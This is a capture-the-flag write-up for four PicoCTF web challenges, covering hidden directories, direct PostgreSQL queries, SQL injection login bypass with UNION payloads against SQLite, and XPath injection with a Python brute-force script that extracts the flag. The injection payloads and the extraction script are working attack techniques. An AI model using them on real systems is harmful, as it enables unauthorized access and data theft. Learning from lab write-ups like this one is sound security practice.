# PicoCTF Web Exploitation: 33-36

## 33. Secrets

<details>

<summary>Provided Hints:</summary>

folders folders folders

</details>

We have several pages hidden. Can you find the one with the flag? The website is running [here](http://saturn.picoctf.net:52025/).

Looking at the sources of the website, we see a secret/assets directory containing an image and the css page for index. Lets try to change directories to the /secret directory.

<figure><img src=".gitbook/assets/Screenshot_2023-06-08_12_04_58.png" alt=""><figcaption></figcaption></figure>

Similarly, in the secret directory, we see a /hidden directory within it. Again, change directories to our hidden directory.

\----------------------------------------Challenge Broken-------------------------------------------

## 34. SQL Direct

<details>

<summary>Provided Hints:</summary>

(None)

</details>

**Description:** Connect to this PostgreSQL server and find the flag!&#x20;

Additional details will be available after launching your challenge instance.

Launch the instance and run the psql command provided along with the password. Looking at the commands for psql, we see variations of the \d flag to list table information.

<figure><img src=".gitbook/assets/Screenshot_2023-06-08_12_34_43.png" alt=""><figcaption></figcaption></figure>

Running the command lists the tables and we see a table named flags. Using the sql command "select \* from flags;" we see all the information stored within the "flags" table including the flag for the challenge.

<figure><img src=".gitbook/assets/Screenshot_2023-06-08_12_36_42.png" alt=""><figcaption></figcaption></figure>

## 35. More SQLi

<details>

<summary>Provided Hints:</summary>

(None)

</details>

**Description:** Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

The website takes us to a login page that is probably vulnerable to an SQL injection. Attempting some default credentials leads us to a page that shows us the SQL query being made with our input.

<figure><img src=".gitbook/assets/Screenshot_2023-06-08_12_42_35.png" alt=""><figcaption></figcaption></figure>

Seeing how the query searches for the password first, we want a payload in the password field. Looking at our list of [SQL injection payloads](https://github.com/payloadbox/sql-injection-payload-list) we want to use any payload that will return a true. Generally, returning a true for an input field in SQL injection will bypass authentication checks helping us gain unauthorized access. As long as our password fits this need, we can append any end-of-line or comment operator to ignore the rest of the query.

<pre><code>PAYLOAD:
username: (anything)
password: ' or 1=1;

RESULTING QUERY:
SELECT id FROM users WHERE password = '' OR 1=1;' <a data-footnote-ref href="#user-content-fn-1">AND username = 'admin'</a>
</code></pre>

Observe the initial apostrophe (') closing the password string value, moving the query onto the "or 1=1' statement. This statement, returning a true, bypasses the password check and lastly, the semi-colon (;) terminates the line, causing the query to ignore the rest.

Entering the payload leads us to a table with another input field. Knowing the site utilizes an SQLite database, we can query the sqlite\_master table. which stores all table, view, index, and trigger information for the database.&#x20;

```
PAYLOAD:
' union select sql, 1, 1 sqlite_master;
```

The apostrophe closes the existing string, "union select sql"  performs a UNION operation, combining the results of the original query with the results of the injected query. "1, 1" acting as a placeholder, are used in the injected query to match the column count of the original query. Lastly, "sqlite\_master" is the table we want to query, making sure to end the payload with a semi-colon.

<figure><img src=".gitbook/assets/Screenshot_2023-06-08_13_05_13.png" alt=""><figcaption></figcaption></figure>

In the sqlite\_master table we see the mention of flag. It looks like the flag is present in the more\_table table. Again, we can query this table using the payload below, giving us our flag.

```
PAYLOAD:
' union select flag, 1, 1 from more_table;
```

<figure><img src=".gitbook/assets/Screenshot_2023-06-08_13_06_50.png" alt=""><figcaption></figcaption></figure>

## 36. X Marks the Spot

<details>

<summary>Provided Hints:</summary>

XPATH

</details>

Another login you have to bypass. Maybe you can find an injection that works? [http://mercury.picoctf.net:59946/](http://mercury.picoctf.net:59946/)

From the hint, we know this site is using XPATH, which is used to navigate or point to nodes in an XML document. Similar to in an SQL injection, we can also use payloads in XPATH syntax to gain unauthorized access or information. Using the always true payload below tells us we are on the right track.

```
PAYLOAD:
username: ' or 1=1 or '
passowrd: (anything)
```

Looking at some additional XPATH functions, we can use the "contains" function to any specified string or web element. General format below.

```
GENERAL CONTAINS FORMAT:
//tagname[contains (@Attribute, ‘Value’)]
```

Knowing this, we could query for the string of "picoCTF{" in the database. After adjusting the payload, it should look like this.

```
PAYLOAD:
' or //*[contains(.,"picoCTF{")] or '
```

Again, it tells us we are on the right path... It looks like we need to brute force the query to find our flag. Using python we can write a simple loop that makes POST requests to the site with our payload until we find the flag. Python script below (read comments for clarity).

```
BRUTE FORCE SCRIPT:

import requests
import string

# part of the flag we already know
current_flag = "picoCTF{"
# all available characters within a picoCTF flag (no uppercase!)
available_chars = string.ascii_lowercase + string.digits + "}" + "_"

# whie loop with "}" as our ending condition as we know thats what a flag ends with
while "}" not in current_flag:
    # for loop iterating through all of our avialable characters
    for i in available_chars:
        # making POST request at the site with name as our payload + current_flag and our iterative and pass as "pass"
        r = requests.post("http://mercury.picoctf.net:59946/", {"name": "' or //*[contains(.,\"" + current_flag + i + "\")] or 'a", "pass": "pass"})
        # if "right path" message in our output for our request...
        if "right path" in r.text:
            # append the iterative to our flag
            current_flag = current_flag + i
            # print the flag
            print(current_flag)
            # break from the loop
            break
```

Running this script gives us our flag in a couple minutes.

<figure><img src=".gitbook/assets/Screenshot_2023-06-08_14_20_11.png" alt=""><figcaption></figcaption></figure>

[^1]: ignored
